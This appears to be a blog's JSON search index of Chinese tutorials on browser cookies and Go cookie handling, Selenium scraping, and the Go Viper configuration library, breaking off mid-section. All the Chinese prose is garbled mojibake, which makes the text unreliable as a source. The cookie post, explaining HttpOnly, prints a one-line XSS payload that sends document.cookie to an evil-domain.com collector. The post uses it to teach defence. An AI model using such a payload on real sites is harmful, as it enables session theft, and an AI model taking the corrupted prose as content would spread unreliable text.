Cookieã€‚åªè¦æµè§ˆå™¨å‘ç°ï¼Œ`Path`å±æ€§æ˜¯ HTTP è¯·æ±‚è·¯å¾„çš„å¼€å¤´ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šåœ¨å¤´ä¿¡æ¯é‡Œé¢å¸¦ä¸Šè¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ`PATH`å±æ€§æ˜¯`/`ï¼Œé‚£ä¹ˆè¯·æ±‚`/docs`è·¯å¾„ä¹Ÿä¼šåŒ…å«è¯¥ Cookieã€‚å½“ç„¶ï¼Œå‰ææ˜¯åŸŸåå¿…é¡»ä¸€è‡´ã€‚\n\n\n\n> 1.3.3 Secureï¼ŒHttpOnly\n\n`Secure`å±æ€§æŒ‡å®šæµè§ˆå™¨åªæœ‰åœ¨åŠ å¯†åè®® HTTPS ä¸‹ï¼Œæ‰èƒ½å°†è¿™ä¸ª Cookie å‘é€åˆ°æœåŠ¡å™¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå½“å‰åè®®æ˜¯ HTTPï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¿½ç•¥æœåŠ¡å™¨å‘æ¥çš„`Secure`å±æ€§ã€‚è¯¥å±æ€§åªæ˜¯ä¸€ä¸ªå¼€å…³ï¼Œä¸éœ€è¦æŒ‡å®šå€¼ã€‚å¦‚æœé€šä¿¡æ˜¯ HTTPS åè®®ï¼Œè¯¥å¼€å…³è‡ªåŠ¨æ‰“å¼€ã€‚\n\n`HttpOnly`å±æ€§æŒ‡å®šè¯¥ Cookie æ— æ³•é€šè¿‡ JavaScript è„šæœ¬æ‹¿åˆ°ï¼Œä¸»è¦æ˜¯`Document.cookie`å±æ€§ã€`XMLHttpRequest`å¯¹è±¡å’Œ Request API éƒ½æ‹¿ä¸åˆ°è¯¥å±æ€§ã€‚è¿™æ ·å°±é˜²æ­¢äº†è¯¥ Cookie è¢«è„šæœ¬è¯»åˆ°ï¼Œåªæœ‰æµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¯¥ Cookieã€‚\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\nä¸Šé¢æ˜¯è·¨ç«™ç‚¹è½½å…¥çš„ä¸€ä¸ªæ¶æ„è„šæœ¬çš„ä»£ç ï¼Œèƒ½å¤Ÿå°†å½“å‰ç½‘é¡µçš„ Cookie å‘å¾€ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ª Cookie çš„`HttpOnly`å±æ€§ï¼Œä¸Šé¢ä»£ç å°±ä¸ä¼šè¯»åˆ°è¯¥ Cookieã€‚\n\n\n\n##### 1.4 document.cookie\n\n`document.cookie`å±æ€§ç”¨äºè¯»å†™å½“å‰ç½‘é¡µçš„ Cookieã€‚\n\nè¯»å–çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›å½“å‰ç½‘é¡µçš„æ‰€æœ‰ Cookieï¼Œå‰ææ˜¯è¯¥ Cookie ä¸èƒ½æœ‰`HTTPOnly`å±æ€§ã€‚\n\n```\ndocument.cookie // \"foo=bar;baz=bar\"\n```\n\nä¸Šé¢ä»£ç ä»`document.cookie`ä¸€æ¬¡æ€§è¯»å‡ºä¸¤ä¸ª Cookieï¼Œå®ƒä»¬ä¹‹é—´ä½¿ç”¨åˆ†å·åˆ†éš”ã€‚å¿…é¡»æ‰‹åŠ¨è¿˜åŸï¼Œæ‰èƒ½å–å‡ºæ¯ä¸€ä¸ª Cookie çš„å€¼ã€‚\n\n```\nvar cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n```\n\n`document.cookie`å±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒä¸ºå½“å‰ç½‘ç«™æ·»åŠ  Cookieã€‚\n\n```\ndocument.cookie = 'fontSize=14';\n```\n\nå†™å…¥çš„æ—¶å€™ï¼ŒCookie çš„å€¼å¿…é¡»å†™æˆ`key=value`çš„å½¢å¼ã€‚æ³¨æ„ï¼Œç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ã€‚å¦å¤–ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¿…é¡»å¯¹åˆ†å·ã€é€—å·å’Œç©ºæ ¼è¿›è¡Œè½¬ä¹‰ï¼ˆå®ƒä»¬éƒ½ä¸å…è®¸ä½œä¸º Cookie çš„å€¼ï¼‰ï¼Œè¿™å¯ä»¥ç”¨`encodeURIComponent`æ–¹æ³•è¾¾åˆ°ã€‚\n\nä½†æ˜¯ï¼Œ`document.cookie`ä¸€æ¬¡åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼Œè€Œä¸”å†™å…¥å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯æ·»åŠ ã€‚\n\n```\ndocument.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n```\n\n`document.cookie`è¯»å†™è¡Œä¸ºçš„å·®å¼‚ï¼ˆä¸€æ¬¡å¯ä»¥è¯»å‡ºå…¨éƒ¨ Cookieï¼Œä½†æ˜¯åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼‰ï¼Œä¸ HTTP åè®®çš„ Cookie é€šä¿¡æ ¼å¼æœ‰å…³ã€‚æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ Cookie çš„æ—¶å€™ï¼Œ`Cookie`å­—æ®µæ˜¯ä½¿ç”¨ä¸€è¡Œå°†æ‰€æœ‰ Cookie å…¨éƒ¨å‘é€ï¼›æœåŠ¡å™¨å‘æµè§ˆå™¨è®¾ç½® Cookie çš„æ—¶å€™ï¼Œ`Set-Cookie`å­—æ®µæ˜¯ä¸€è¡Œè®¾ç½®ä¸€ä¸ª Cookieã€‚\n\n\n\nå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€èµ·å†™å…¥ Cookie çš„å±æ€§ã€‚\n\n```\ndocument.cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\";\n```\n\n\n\nä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼ŒåŒæ—¶è®¾ç½®äº†`expires`å±æ€§ã€‚å±æ€§å€¼çš„ç­‰å·ä¸¤è¾¹ï¼Œä¹Ÿæ˜¯ä¸èƒ½æœ‰ç©ºæ ¼çš„ã€‚\n\nå„ä¸ªå±æ€§çš„å†™å…¥æ³¨æ„ç‚¹å¦‚ä¸‹ã€‚\n\n- `path`å±æ€§å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œé»˜è®¤ä¸ºå½“å‰è·¯å¾„ã€‚\n- `domain`å±æ€§å€¼å¿…é¡»æ˜¯å½“å‰å‘é€ Cookie çš„åŸŸåçš„ä¸€éƒ¨åˆ†ã€‚æ¯”å¦‚ï¼Œå½“å‰åŸŸåæ˜¯`example.com`ï¼Œå°±ä¸èƒ½å°†å…¶è®¾ä¸º`foo.com`ã€‚è¯¥å±æ€§é»˜è®¤ä¸ºå½“å‰çš„ä¸€çº§åŸŸåï¼ˆä¸å«äºŒçº§åŸŸåï¼‰ã€‚\n- `max-age`å±æ€§çš„å€¼ä¸ºç§’æ•°ã€‚\n- `expires`å±æ€§çš„å€¼ä¸º UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨`Date.prototype.toUTCString()`è¿›è¡Œæ—¥æœŸæ ¼å¼è½¬æ¢ã€‚\n\n\n\n`document.cookie`å†™å…¥ Cookie çš„ä¾‹å­å¦‚ä¸‹ã€‚\n\n```\ndocument.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n```\n\nCookie çš„å±æ€§ä¸€æ—¦è®¾ç½®å®Œæˆï¼Œå°±æ²¡æœ‰åŠæ³•è¯»å–è¿™äº›å±æ€§çš„å€¼ã€‚\n\nåˆ é™¤ä¸€ä¸ªç°å­˜ Cookie çš„å”¯ä¸€æ–¹æ³•ï¼Œæ˜¯è®¾ç½®å®ƒçš„`expires`å±æ€§ä¸ºä¸€ä¸ªè¿‡å»çš„æ—¥æœŸã€‚\n\n```\ndocument.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n```\n\nä¸Šé¢ä»£ç ä¸­ï¼Œåä¸º`fontSize`çš„ Cookie çš„å€¼ä¸ºç©ºï¼Œè¿‡æœŸæ—¶é—´è®¾ä¸º1970å¹´1æœˆ1æœˆé›¶ç‚¹ï¼Œå°±ç­‰åŒäºåˆ é™¤äº†è¿™ä¸ª Cookieã€‚\n\n\n\n### 2. golang ä½¿ç”¨ cookie\n\n+ cookieçš„ç»“æ„ä½“å¦‚ä¸‹:\n\n```Â go\ntype Cookie struct {\n    Name  string\n    Value string\n\n    Path       string    // optional\n    Domain     string    // optional\n    Expires    time.Time // optional\n    RawExpires string    // for reading cookies only\n\n    // MaxAge=0 means no 'Max-Age' attribute specified.\n    // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'\n    // MaxAge>0 means Max-Age attribute present and given in seconds\n    MaxAge   int\n    Secure   bool\n    HttpOnly bool\n    Raw      string\n    Unparsed []string // Raw text of unparsed attribute-value pairs\n}\n```\n\n+ cookie æ“ä½œ\n\n```go\n//è®¾ç½®Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   3600 * 24,\n\t\tHttpOnly: true,\n\t})\n\n//è¯»å–Cookie\ncookie, err := req.Cookie(\"auth_token\")\n\n//åˆ é™¤Cookie\n\thttp.SetCookie(w, &http.Cookie{\n\t\tName:     \"auth_token\",\n\t\tValue:    token,\n\t\tDomain:   \"\",\n\t\tPath:     \"/\",\n\t\tMaxAge:   -1,\n\t\tHttpOnly: true,\n\t})\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://studygolang.com/articles/5905\n\n+ https://javascript.ruanyifeng.com/bom/cookie.html\n\n","tags":["cookie"],"categories":["Web"]},{"title":"çˆ¬è™«åˆ©å™¨seleniumå’Œæ— å¤´æµè§ˆå™¨çš„ä½¿ç”¨","url":"%2Fp%2F545fa06.html","content":"\n\n\n### 0. å‰è¨€\n\nSelenium çš„åˆè¡·æ˜¯æ‰“é€ ä¸€æ¬¾ä¼˜ç§€çš„è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ï¼Œä½†æ˜¯æ…¢æ…¢çš„äººä»¬å°±å‘ç°ï¼ŒSelenium çš„è‡ªåŠ¨åŒ–ç”¨æ¥åšçˆ¬è™«æ­£åˆé€‚ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œä¼ ç»Ÿçš„çˆ¬è™«é€šè¿‡ç›´æ¥æ¨¡æ‹Ÿ HTTP è¯·æ±‚æ¥çˆ¬å–ç«™ç‚¹ä¿¡æ¯ï¼Œç”±äºè¿™ç§æ–¹å¼å’Œæµè§ˆå™¨è®¿é—®å·®å¼‚æ¯”è¾ƒæ˜æ˜¾ï¼Œå¾ˆå¤šç«™ç‚¹éƒ½é‡‡å–äº†ä¸€äº›åçˆ¬çš„æ‰‹æ®µï¼Œè€Œ Selenium æ˜¯é€šè¿‡æ¨¡æ‹Ÿæµè§ˆå™¨æ¥çˆ¬å–ä¿¡æ¯ï¼Œå…¶è¡Œä¸ºå’Œç”¨æˆ·å‡ ä¹ä¸€æ ·ï¼Œåçˆ¬ç­–ç•¥ä¹Ÿå¾ˆéš¾åŒºåˆ†å‡ºè¯·æ±‚åˆ°åº•æ˜¯æ¥è‡ª Selenium è¿˜æ˜¯çœŸå®ç”¨æˆ·ã€‚\n\n\n\né€šè¿‡ Selenium æ¥åšçˆ¬è™«ï¼Œä¸ç”¨å»åˆ†ææ¯ä¸ªè¯·æ±‚çš„å…·ä½“å‚æ•°ï¼Œæ¯”èµ·ä¼ ç»Ÿçš„çˆ¬è™«å¼€å‘èµ·æ¥æ›´å®¹æ˜“ã€‚Selenium çˆ¬è™«å”¯ä¸€çš„ä¸è¶³æ˜¯æ…¢ï¼Œå¦‚æœä½ å¯¹çˆ¬è™«çš„é€Ÿåº¦æ²¡æœ‰è¦æ±‚ï¼Œé‚£ä½¿ç”¨ Selenium æ˜¯ä¸ªéå¸¸ä¸é”™çš„é€‰æ‹©ã€‚\n\n<!-- more -->\n\n### 1. å®‰è£…å’Œä½¿ç”¨\n\n```bash\npip install selenium \n```\n\n\n\n##### 1.1 é¡µé¢æ“ä½œ\n\n```python\n# è¾“å…¥æ•°æ®\nbrowser.find_element_by_css_selector('.rfm input[name=\"username\"]').send_keys('123456')\n\n# é€‰æ‹©æ•°æ®\nbrowser.find_element_by_xpath(\"//select[@name='questionid']/option[text()='çˆ¶äº²çš„æ‰‹æœºå·ç ']\").click()\n\n# æ•²å›è½¦\nbrowser.find_element_by_css_selector('button[name=\"loginsubmit\"]').send_keys(Keys.ENTER)\n\n\n# åªç­‰3ç§’\nbrowser.implicitly_wait(3)\n\n# è·å–cookie\ncookies_list = driver.get_cookies()\ncookies_dict = {}\nfor cookie in cookies_list:\n    cookies_dict[cookie['name']] = cookie['value']\nprint(cookies_dict)\n```\n\n\n\n### 2. é‡åˆ°çš„é—®é¢˜\n\n\n\n##### 2.1 [ImportError: cannot import name 'webdriver'](https://stackoverflow.com/questions/29092970/importerror-cannot-import-name-webdriver)\n\næ–‡ä»¶ä¸èƒ½å‘½åä¸º`selenium`\n\n\n\n##### 2.2  Message: 'chromedriver' executable needs to be in PATH.\n\nä¸‹è½½é©±åŠ¨ https://sites.google.com/a/chromium.org/chromedriver/downloads\n\n\n\n##### 2.3 Message: unknown error: cannot find Chrome binary\n\n+ centos å®‰è£… chrome\n\n  ```bash\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm\n  sudo yum localinstall google-chrome-stable_current_x86_64.rpm\n  google-chrome --no-sandbox --version # çœ‹åˆ°ç‰ˆæœ¬åå»ä¸‹è½½ç›¸å…³çš„driver\n  ```\n\n+ ubuntu å®‰è£… chrome\n\n  ```\n  wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\n  sudo apt install ./google-chrome-stable_current_amd64.deb\ngoogle-chrome --no-sandbox --version\n  ```\n  \n  \n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://cuiqingcai.com/2599.html\n\n+ [Python3ä¸­Seleniumä½¿ç”¨æ–¹æ³•](https://zhuanlan.zhihu.com/p/29435831)\n\n\n+ [ä½¿ç”¨ Python + Selenium æ‰“é€ æµè§ˆå™¨çˆ¬è™«](https://www.aneasystone.com/archives/2018/02/python-selenium-spider.html)","tags":["çˆ¬è™«"],"categories":["çˆ¬è™«"]},{"title":"golangé…ç½®ä¿¡æ¯åº“viperçš„ä½¿ç”¨","url":"%2Fp%2Fe2f28eb4.html","content":"\n\n\n### 0. å‰è¨€\n\nViper(æ¯’è›‡)æ˜¯ä¸€ä¸ªæ–¹ä¾¿Goè¯­è¨€åº”ç”¨ç¨‹åºå¤„ç†é…ç½®ä¿¡æ¯çš„åº“ã€‚å®ƒå¯ä»¥å¤„ç†å¤šç§æ ¼å¼çš„é…ç½®ã€‚å®ƒæ”¯æŒçš„ç‰¹æ€§ï¼š\n\n- è®¾ç½®é»˜è®¤å€¼\n- ä»JSONï¼ŒTOMLï¼ŒYAMLï¼ŒHCLå’ŒJavaå±æ€§é…ç½®æ–‡ä»¶ä¸­è¯»å–\n- å®æ—¶è§‚çœ‹å’Œé‡æ–°è¯»å–é…ç½®æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰\n- ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–\n- ä»è¿œç¨‹é…ç½®ç³»ç»Ÿï¼ˆetcdæˆ–Consulï¼‰è¯»å–ï¼Œå¹¶è§‚å¯Ÿå˜åŒ–\n- ä»å‘½ä»¤è¡Œæ ‡å¿—è¯»å–\n- ä»ç¼“å†²åŒºè¯»å–\n- è®¾ç½®æ˜¾å¼å€¼\n\n<!-- more -->\n\nViperè¯»å–é…ç½®ä¿¡æ¯çš„ä¼˜å…ˆçº§é¡ºåºï¼Œä»é«˜åˆ°ä½ï¼Œå¦‚ä¸‹ï¼š\n\n- æ˜¾å¼è°ƒç”¨Setå‡½æ•°\n- å‘½ä»¤è¡Œå‚æ•°\n- ç¯å¢ƒå˜é‡\n- é…ç½®æ–‡ä»¶\n- key/value å­˜å‚¨ç³»ç»Ÿ\n- é»˜è®¤å€¼\n\nViper çš„é…ç½®é¡¹çš„keyä¸åŒºåˆ†å¤§å°å†™ã€‚\n\n\n\n### 1. å®‰è£…ä½¿ç”¨\n\n##### 1.0 å®‰è£…\n\n```bash\ngo get -u github.com/spf13/viper\n```\n\n\n\n##### 1.1 è®¾ç½®é»˜è®¤å€¼\n\né»˜è®¤å€¼ä¸æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœé…ç½®æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€è¿œç¨‹é…ç½®ç³»ç»Ÿã€å‘½ä»¤è¡Œå‚æ•°ã€Setå‡½æ•°éƒ½æ²¡æœ‰æŒ‡å®šæ—¶ï¼Œé»˜è®¤å€¼å°†èµ·ä½œç”¨ã€‚\n\n```go\nviper.SetDefault(\"ContentDir\", \"content\")\nviper.SetDefault(\"LayoutDir\", \"layouts\")\nviper.SetDefault(\"Taxonomies\", map[string]string{\"tag\": \"tags\", \"category\": \"categories\"})\n```\n\n\n\n##### 1.2 è¯»å–é…ç½®æ–‡ä»¶\n\nViperæ”¯æŒJSONã€TOMLã€YAMLã€HCLå’ŒJava propertiesæ–‡ä»¶ã€‚\nViperå¯ä»¥æœç´¢å¤šä¸ªè·¯å¾„ï¼Œä½†ç›®å‰å•ä¸ªViperå®ä¾‹ä»…æ”¯æŒå•ä¸ªé…ç½®æ–‡ä»¶ã€‚\nViperé»˜è®¤ä¸æœç´¢ä»»ä½•è·¯å¾„ã€‚\nä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨Viperæœç´¢å’Œè¯»å–é…ç½®æ–‡ä»¶çš„ç¤ºä¾‹ã€‚\nè·¯å¾„ä¸æ˜¯å¿…éœ€çš„ï¼Œä½†æœ€å¥½è‡³å°‘åº”æä¾›ä¸€ä¸ªè·¯å¾„ï¼Œä»¥ä¾¿æ‰¾åˆ°ä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚\n\n```go\nviper.SetConfigName(\"config\") //  è®¾ç½®é…ç½®æ–‡ä»¶å (ä¸å¸¦åç¼€)\nviper.AddConfigPath(\"/etc/appname/\")   // ç¬¬ä¸€ä¸ªæœç´¢è·¯å¾„\nviper.AddConfigPath(\"$HOME/.appname\")  // å¯ä»¥å¤šæ¬¡è°ƒç”¨æ·»åŠ è·¯å¾„\nviper.AddConfigPath(\".\")               // æ¯”å¦‚æ·»åŠ å½“å‰ç›®å½•\nerr := viper.ReadInConfig() // æœç´¢è·¯å¾„ï¼Œå¹¶è¯»å–é…ç½®æ•°æ®\nif err != nil {\n    panic(fmt.Errorf(\"Fatal error config file: %s \\n\", err))\n}\n```\n\n\n\n##### 1.3 ç›‘è§†é…ç½®æ–‡ä»¶ï¼Œé‡æ–°è¯»å–é…ç½®æ•°æ®\n\nViperæ”¯æŒè®©æ‚¨çš„åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶æ‹¥æœ‰è¯»å–é…ç½®æ–‡ä»¶çš„èƒ½åŠ›ã€‚\néœ€è¦é‡æ–°å¯åŠ¨æœåŠ¡å™¨ä»¥ä½¿é…ç½®ç”Ÿæ•ˆçš„æ—¥å­å·²ç»ä¸€å»ä¸å¤è¿”äº†ï¼Œç”±viperé©±åŠ¨çš„åº”ç”¨ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶è¯»å–å·²æ›´æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸ä¼šé”™è¿‡ä»»ä½•èŠ‚æ‹ã€‚\nåªéœ€è¦è°ƒç”¨viperå®ä¾‹çš„WatchConfigå‡½æ•°ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªå›è°ƒå‡½æ•°æ¥è·å¾—å˜åŠ¨çš„é€šçŸ¥ã€‚\n\n```go\nviper.WatchConfig()\nviper.OnConfigChange(func(e fsnotify.Event) {\n    fmt.Println(\"Config file changed:\", e.Name)\n})\n```\n\n\n\n##### 1.4 ä» io.Reader ä¸­è¯»å–é…ç½®\n\nViperé¢„å…ˆå®šä¹‰äº†è®¸å¤šé…ç½®æºï¼Œä¾‹å¦‚æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€å‘½ä»¤è¡Œå‚æ•°å’Œè¿œç¨‹K / Vå­˜å‚¨ç³»ç»Ÿï¼Œä½†æ‚¨å¹¶æœªå—å…¶çº¦æŸã€‚\næ‚¨ä¹Ÿå¯ä»¥å®ç°è‡ªå·±çš„é…ç½®æºï¼Œå¹¶æä¾›ç»™viperã€‚\n\n```go\nviper.SetConfigType(\"yaml\") // or viper.SetConfigType(\"YAML\")\n\n// any approach to require this configuration into your program.\nvar yamlExample = []byte(`\nHacker: true\nname: steve\nhobbies:\n- skateboarding\n- snowboarding\n- go\nclothing:\n  jacket: leather\n  trousers: denim\nage: 35\neyes : brown\nbeard: true\n`)\n\nviper.ReadConfig(bytes.NewBuffer(yamlExample))\nviper.Get(\"name\") // è¿”å› \"steve\"\n```\n\n\n\n##### 1.5 æ³¨å†Œå¹¶ä½¿ç”¨åˆ«å\n\n```go\nviper.RegisterAlias(\"loud\", \"Verbose\")\n\nviper.Set(\"verbose\", true) \nviper.Set(\"loud\", true)   // è¿™ä¸¤å¥è®¾ç½®çš„éƒ½æ˜¯åŒä¸€ä¸ªå€¼\n\nviper.GetBool(\"loud\") // true\nviper.GetBool(\"verbose\") // true\n```\n\n\n\n##### 1.6 ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–\n\nViper å®Œå…¨æ”¯æŒç¯å¢ƒå˜é‡ï¼Œè¿™æ˜¯çš„åº”ç”¨ç¨‹åºå¯ä»¥å¼€ç®±å³ç”¨ã€‚\næœ‰å››ä¸ªå’Œç¯å¢ƒå˜é‡æœ‰å…³çš„æ–¹æ³•ï¼š\n\n+ AutomaticEnv()\n+ BindEnv(string...) : error\n+ SetEnvPrefix(string)\n+ SetEnvKeyReplacer(string...) *strings.Replacer\n\næ³¨æ„ï¼Œç¯å¢ƒå˜é‡æ—¶åŒºåˆ†å¤§å°å†™çš„ã€‚\n\nViperæä¾›äº†ä¸€ç§æœºåˆ¶æ¥ç¡®ä¿Envå˜é‡æ˜¯å”¯ä¸€çš„ã€‚é€šè¿‡SetEnvPrefixï¼Œåœ¨ä»ç¯å¢ƒå˜é‡è¯»å–æ—¶ä¼šæ·»åŠ è®¾ç½®çš„å‰ç¼€ã€‚BindEnvå’ŒAutomaticEnvéƒ½ä¼šä½¿ç”¨åˆ°è¿™ä¸ªå‰ç¼€ã€‚\n\nBindEnvéœ€è¦ä¸€ä¸ªæˆ–ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é”®åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¯å¢ƒå˜é‡çš„åç§°ã€‚ç¯å¢ƒå˜é‡çš„åç§°åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœæœªæä¾›ENVå˜é‡åç§°ï¼Œåˆ™Viperä¼šè‡ªåŠ¨å‡å®šè¯¥é”®åç§°ä¸ENVå˜é‡åç§°åŒ¹é…ï¼Œå¹¶ä¸”ENVå˜é‡ä¸ºå…¨éƒ¨å¤§å†™ã€‚å½“æ‚¨æ˜¾å¼æä¾›ENVå˜é‡åç§°æ—¶ï¼Œå®ƒä¸ä¼šè‡ªåŠ¨æ·»åŠ å‰ç¼€ã€‚\n\nä½¿ç”¨ENVå˜é‡æ—¶è¦æ³¨æ„ï¼Œå½“å…³è”åï¼Œæ¯æ¬¡è®¿é—®æ—¶éƒ½ä¼šè¯»å–è¯¥ENVå€¼ã€‚Viperåœ¨BindEnvè°ƒç”¨æ—¶ä¸è¯»å–ENVå€¼ã€‚\n\nAutomaticEnvä¸SetEnvPrefixç»“åˆå°†ä¼šç‰¹åˆ«æœ‰ç”¨ã€‚å½“AutomaticEnvè¢«è°ƒç”¨æ—¶ï¼Œä»»ä½•viper.Getè¯·æ±‚éƒ½ä¼šå»è·å–ç¯å¢ƒå˜é‡ã€‚ç¯å¢ƒå˜é‡åä¸ºSetEnvPrefixè®¾ç½®çš„å‰ç¼€ï¼ŒåŠ ä¸Šå¯¹åº”åç§°çš„å¤§å†™ã€‚\n\nSetEnvKeyReplacerå…è®¸ä½ ä½¿ç”¨ä¸€ä¸ªstrings.Replacerå¯¹è±¡æ¥å°†é…ç½®åé‡å†™ä¸ºEnvåã€‚å¦‚æœä½ æƒ³åœ¨Get()ä¸­ä½¿ç”¨åŒ…å«-çš„é…ç½®å ï¼Œä½†å¸Œæœ›å¯¹åº”çš„ç¯å¢ƒå˜é‡ååŒ…å«_åˆ†éš”ç¬¦ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ä½¿ç”¨å®ƒçš„ä¸€ä¸ªä¾‹å­å¯ä»¥åœ¨é¡¹ç›®ä¸­viper_test.goæ–‡ä»¶é‡Œæ‰¾åˆ°ã€‚\nä¾‹å­ï¼š\n\n```go\nSetEnvPrefix(\"spf\") // å°†ä¼šè‡ªåŠ¨è½¬ä¸ºå¤§å†™\nBindEnv(\"id\")\n\nos.Setenv(\"SPF_ID\", \"13\") // é€šå¸¸é€šè¿‡ç³»ç»Ÿç¯å¢ƒå˜é‡æ¥è®¾ç½®\n\nid := Get(\"id\") // 13\n```\n\n\n\n##### 1.7 ç»‘å®šå‘½ä»¤è¡Œå‚æ•°\n\nViperæ”¯æŒç»‘å®špflagså‚æ•°ã€‚\nå’ŒBindEnvä¸€æ ·ï¼Œå½“ç»‘å®šæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œè¯¥å€¼æ²¡æœ‰è¢«è·å–ï¼Œè€Œæ˜¯åœ¨è¢«è®¿é—®æ—¶è·å–ã€‚è¿™æ„å‘³ç€åº”è¯¥å°½æ—©è¿›è¡Œç»‘å®šï¼Œç”šè‡³æ˜¯åœ¨init()å‡½æ•°ä¸­ç»‘å®šã€‚\n\nåˆ©ç”¨BindPFlag()æ–¹æ³•å¯ä»¥ç»‘å®šå•ä¸ªflagã€‚ä¾‹å­ï¼š\n\n```go\nserverCmd.Flags().Int(\"port\", 1138, \"Port to run Application server on\")\nviper.BindPFlag(\"port\", serverCmd.Flags().Lookup(\"port\"))\n```\n\n\nä½ ä¹Ÿå¯ä»¥ç»‘å®šå·²å­˜åœ¨çš„pflagé›†åˆ (pflag.FlagSet):\n\n```go\npflag.Int(\"flagname\", 1234, \"help message for flagname\")\n\npflag.Parse()\nviper.BindPFlags(pflag.CommandLine)\n\ni := viper.GetInt(\"flagname\") // é€šè¿‡viperä»pflagä¸­è·å–å€¼\n```\n\n\nä½¿ç”¨pflagå¹¶ä¸å½±å“å…¶ä»–åº“ä½¿ç”¨æ ‡å‡†åº“ä¸­çš„flagã€‚é€šè¿‡å¯¼å…¥ï¼Œpflagå¯ä»¥æ¥ç®¡é€šè¿‡æ ‡å‡†åº“çš„flagå®šä¹‰çš„å‚æ•°ã€‚è¿™æ˜¯é€š`è¿‡è°ƒç”¨pflagåŒ…ä¸­çš„AddGoFlagSet()æ–¹æ³•å®ç°çš„ã€‚ä¾‹å­ï¼š\n\n```go\npackage main\n\nimport (\n    \"flag\"\n    \"github.com/spf13/pflag\"\n)\n\nfunc main() {\n\n    // using standard library \"flag\" package\n    flag.Int(\"flagname\", 1234, \"help message for flagname\")\n\n    pflag.CommandLine.AddGoFlagSet(flag.CommandLine)\n    pflag.Parse()\n    viper.BindPFlags(pflag.CommandLine)\n\n    i := viper.GetInt(\"flagname\") // retrieve value from viper\n\n    ...\n}\n```\n\n\n\n##### 1.8 è·å–å€¼\n\nåœ¨Viperä¸­ï¼Œæœ‰ä¸€äº›æ ¹æ®å€¼çš„ç±»å‹è·å–å€¼çš„æ–¹æ³•ã€‚å­˜åœ¨ä¸€ä¸‹æ–¹æ³•ï¼š\n\n+ Get(key string) : interface{}\n\n+ GetBool(key string) : bool\n\n+ GetFloat64(key string) : float64\n\n+ GetInt(key string) : int\n\n+ GetString(key string) : string\n\n+ GetStringMap(key string) : map[string]interface{}\n\n+ GetStringMapString(key string) : map[string]string\n\n+ GetStringSlice(key string) : []string\n\n+ GetTime(key string) : time.Time\n\n+ GetDuration(key string) : time.Duration\n\n+ IsSet(key string) : bool\n\n\nå¦‚æœGetå‡½æ•°æœªæ‰¾åˆ°å€¼ï¼Œåˆ™è¿”å›å¯¹åº”ç±»å‹çš„ä¸€ä¸ªé›¶å€¼ã€‚å¯ä»¥é€šè¿‡ IsSet() æ–¹æ³•æ¥æ£€æµ‹ä¸€ä¸ªå¥æ˜¯å¦å­˜åœ¨ã€‚ä¾‹å­:\n\n```go\nviper.GetString(\"logfile\") // Setting & Getting ä¸åŒºåˆ†å¤§å°å†™\nif viper.GetBool(\"verbose\") {\n    fmt.Println(\"verbose enabled\")\n}\n```\n\n\n\n##### 1.9 